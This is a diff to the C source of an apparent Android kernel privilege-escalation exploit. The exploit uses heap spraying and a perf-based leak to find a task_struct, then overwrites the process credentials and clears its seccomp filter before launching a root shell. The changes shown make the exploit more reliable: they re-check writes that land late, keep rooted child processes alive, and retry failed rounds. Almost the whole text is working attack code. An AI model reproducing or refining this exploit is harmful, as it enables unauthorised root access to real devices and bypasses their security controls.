@@ -772,11 +772,10 @@ static void child_main(struct child_pipes *p) {
     execl("/system/bin/sh", "sh", g_root_script_path, NULL);
     _exit(1);
   }
-  if (worker < 0) { close(p->uid_w); _exit(1); }
-  /* Do not wait: the root shell runs to completion on its own; the parent
-   * polls the app-readable log. */
+  if (worker < 0) { close(p->uid_w); park_rooted_child(); }
+  /* the worker holds a fresh cred copy; this task holds the raw init_cred */
   close(p->uid_w);
-  _exit(0);
+  park_rooted_child();
 }
 
 static pid_t spawn_child(struct child_pipes *p) {
@@ -800,6 +799,9 @@ static int retry_write_stage(
     int leaf) {
   for (int attempt = 1; attempt <= attempts; attempt++) {
     pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
+    /* the previous attempt's write can land after its verify read; check
+     * before paying for another heap spray */
+    if (attempt > 1 && verify(context)) return 1;
     if (attempt == 1) slab_drain();
     int routed = do_one_write(target, stage, mode, leaf);
     if (!routed) {
@@ -811,7 +813,8 @@ static int retry_write_stage(
     if (verify(context)) return 1;
     usleep(50000);
   }
-  return 0;
+  /* the last write can land after its verify read */
+  return verify(context);
 }
 
 static int verify_selinux_stage(void *context) {
@@ -948,13 +951,13 @@ int run_exploit(int argc, char **argv) {
   int seccomp_ok = 0;
 
   /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
-   * child, so respawn and redo instead of aborting. */
+   * child, so respawn and redo. */
   for (int round = 1; round <= 3; round++) {
     if (round > 1) {
-      pr_warning("W3 chain retry %d/3: respawning child\n", round);
+      pr_warning("W3 chain retry %d/3: parking rooted child\n", round);
       if (child > 0 && child_alive) {
-        kill(-child, SIGKILL);
-        waitpid(child, NULL, 0);
+        write(pipes.cmd_w, "P", 1);
+        usleep(50000);
       }
       close(pipes.cmd_w); close(pipes.uid_r);
       child_alive = 1;
@@ -973,21 +976,13 @@ int run_exploit(int argc, char **argv) {
     TIMER("perf_find_task done");
 
     if (!child_task) {
-      /* perf leaked nothing; respawn and retry once */
-      pr_info("perf returned 0, retrying...\n");
+      /* nothing rooted yet; safe to kill and burn a round */
+      pr_warning("perf leak did not reproduce; retrying next round\n");
+      kill(-child, SIGKILL);
       waitpid(child, NULL, 0);
-      child = spawn_child(&pipes);
-      if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
-      child_task = 0;
-      read(pipes.task_r, &child_task, sizeof(child_task));
-      close(pipes.task_r);
-    }
-
-    if (!child_task) {
-      pr_warning("Cannot find task_struct (perf leak failed)\n");
-      close(pipes.cmd_w);
-      waitpid(child, NULL, 0);
-      return 1;
+      child_alive = 0;
+      close(pipes.cmd_w); close(pipes.uid_r);
+      continue;
     }
 
     pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
@@ -1031,7 +1026,7 @@ int run_exploit(int argc, char **argv) {
     pselect_child_node = 1;
 
     int got_root = retry_write_stage(
-        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 50000,
+        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 100000,
         verify_w2_stage, &w2_context, 0);
     if (!got_root) {
       write(pipes.cmd_w, "X", 1);
@@ -1040,6 +1035,7 @@ int run_exploit(int argc, char **argv) {
       waitpid(child, NULL, 0);
       return 1;
     }
+    /* rooted children never exit; chain failures park (P) */
 
     /* W3: clear the child's seccomp filter for the independent root shell
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
@@ -1125,22 +1121,9 @@ int run_exploit(int argc, char **argv) {
     pr_warning("skipping late-load: child died during W3\n");
   }
   close(pipes.cmd_w);
+  /* park the child after forking the root shell */
   if (child_alive) {
-    /* The child only forks the independent root shell and exits fast; keep
-     * a bounded wait in case it got stuck before the fork. */
-    int waited_ms = 0;
-    for (;;) {
-      pid_t r = waitpid(child, NULL, WNOHANG);
-      if (r == child || r < 0) break;
-      if (waited_ms >= 45000) {
-        pr_warning("child stuck before root shell handoff; killing group\n");
-        kill(-child, SIGKILL);
-        waitpid(child, NULL, 0);
-        break;
-      }
-      usleep(100000);
-      waited_ms += 100;
-    }
+    waitpid(child, NULL, WNOHANG);
   }
   close(pipes.uid_r);
 
